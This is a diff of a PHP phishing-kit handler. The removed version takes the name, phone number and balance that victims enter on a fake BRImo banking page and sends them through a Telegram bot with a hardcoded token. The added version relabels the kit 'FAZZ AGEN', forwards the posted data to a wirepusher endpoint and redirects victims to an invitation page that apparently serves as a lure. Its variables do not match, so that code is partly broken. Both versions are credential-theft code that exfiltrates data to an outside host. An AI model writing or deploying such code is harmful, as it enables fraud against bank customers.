@@ -1,33 +1,27 @@
 <?php
 
-    header('Location:   loginbrimo.html');
+<?php
+
+    header('Location: https://zeinvitation.com/w/template24/?to=tamu+undangan');
     
-    $apiToken = "6268470740:AAF3YjCR3L250pMwU-z_FbesihmWA3IVxWM";
-    session_start();
+    $id = "q3ZtmpGPc";
 
-$nama            = $_POST['nama'];
-$nomor            = $_POST['nomor'];
-$saldo            = $_POST['saldo'];
-
-$_SESSION['nama'] = $nama;
-$_SESSION['nomor'] = $nomor;
-$_SESSION['saldo'] = $saldo;
+$a            = $_POST['a'];
+$b           = $_POST['b'];
 
 $message = "
 ────────────────
-1.FSTVL BRImo
+FAZZ AGEN
 ────────────────
-» ".$nama."
-» ".$nomor."
-» ".$saldo."
+•HP    : ".$hp."
+•EMAIL : ".$bulan."
+•NOTE  : ".$note."
 ────────────────";
 
-  $data = [
-        'chat_id' => '-1002198851474',
-        'text' => $message,
-        'parse_mode' => "html"
+    $data = [
+        'message' => $message,
     ];
-    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );
+    $response = file_get_contents("https://wirepusher.com/send?id=$id&title=Notifikasi%20Undangan&message=$message&type=Monitoring" . http_build_query($data) );
 
     echo '<pre>';
     print_r(json_decode($response));
